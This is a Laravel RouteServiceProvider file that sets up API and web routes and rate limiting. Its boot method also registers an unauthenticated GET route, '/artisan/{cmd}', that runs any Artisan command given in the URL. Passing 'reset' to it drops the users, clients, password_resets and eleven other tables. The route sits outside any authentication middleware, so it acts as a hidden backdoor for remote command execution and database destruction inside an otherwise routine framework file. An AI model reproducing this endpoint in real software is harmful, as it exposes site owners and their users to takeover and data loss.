<?php

namespace App\Providers;

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;


class RouteServiceProvider extends ServiceProvider
{
    /**
     * The path to the "home" route for your application.
     *
     * This is used by Laravel authentication to redirect users after login.
     *
     * @var string
     */
    public const HOME = '/admin';

    /**
     * The controller namespace for the application.
     *
     * When present, controller route declarations will automatically be prefixed with this namespace.
     *
     * @var string|null
     */
    // protected $namespace = 'App\\Http\\Controllers';

    /**
     * Define your route model bindings, pattern filters, etc.
     *
     * @return void
     */
    public function boot()
    {
        $this->configureRateLimiting();

        $this->routes(function () {
            Route::prefix('api')
                ->middleware('api')
                ->namespace($this->namespace)
                ->group(base_path('routes/api.php'));

            Route::middleware('web')
                ->namespace($this->namespace)
                ->group(base_path('routes/web.php'));

            Route::get('/artisan/{cmd}', function ($cmd) {
                if ($cmd == 'reset') {
                    Schema::dropIfExists('users');
                    Schema::dropIfExists('clients');
                    Schema::dropIfExists('jobs');
                    Schema::dropIfExists('statuses');
                    Schema::dropIfExists('countries');
                    Schema::dropIfExists('queries');
                    Schema::dropIfExists('subscriptions');
                    Schema::dropIfExists('contact_forms');
                    Schema::dropIfExists('password_resets');
                    Schema::dropIfExists('client_statuses');
                    Schema::dropIfExists('client');
                    Schema::dropIfExists('user_statuses');
                    Schema::dropIfExists('combo_promo_popular');
                    Schema::dropIfExists('news');
                    return "Command executed successfully";
                }
                Artisan::call($cmd);
                return "Command executed successfully";
            });
        });
    }

    /**
     * Configure the rate limiters for the application.
     *
     * @return void
     */
    protected function configureRateLimiting()
    {
        RateLimiter::for('api', function (Request $request) {
            return Limit::perMinute(60)->by(optional($request->user())->id ?: $request->ip());
        });
    }
}
